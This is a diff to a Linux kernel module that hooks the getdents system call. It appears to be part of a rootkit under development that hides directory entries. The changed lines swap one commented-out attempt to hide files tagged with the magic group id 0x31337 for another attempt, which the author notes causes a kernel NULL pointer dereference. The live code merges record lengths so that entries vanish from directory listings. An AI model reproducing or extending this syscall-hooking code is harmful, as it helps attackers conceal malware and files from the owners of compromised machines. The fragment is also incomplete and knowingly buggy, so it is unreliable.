@@ -15,6 +15,7 @@
 #include <linux/sched.h>
 #include <linux/fs_struct.h>
 #include <linux/stat.h>
+#include <linux/namei.h>
 
 MODULE_LICENSE("GPL");
 
@@ -122,10 +123,11 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned
             d->d_reclen=(d->d_reclen+nd->d_reclen);
         }
         //want to somehow get the gid of the current dirent. if == 0x31337 then hide
-        /*if (getstat->st_gid == 0x31337) {
-            d->d_off=(nd->d_off+d->d_off);
-            d->d_reclen=(d->d_reclen+nd->d_reclen);
-        }*/
+        // get struct file then ->f_dentry->d_inode
+        /*struct file* filp;
+        filp=filp_open(nd->d_name,0,0);
+        printk("%d\n",filp->f_dentry->d_inode->i_gid);
+        filp_close(filp,NULL);*/ //causes kernel NULL pointer deref
         bpos += d->d_reclen; //next
     }
     copy_to_user(dirp,(struct linux_dirent *)buf,sizeof(buf)); //now put it back to userspace
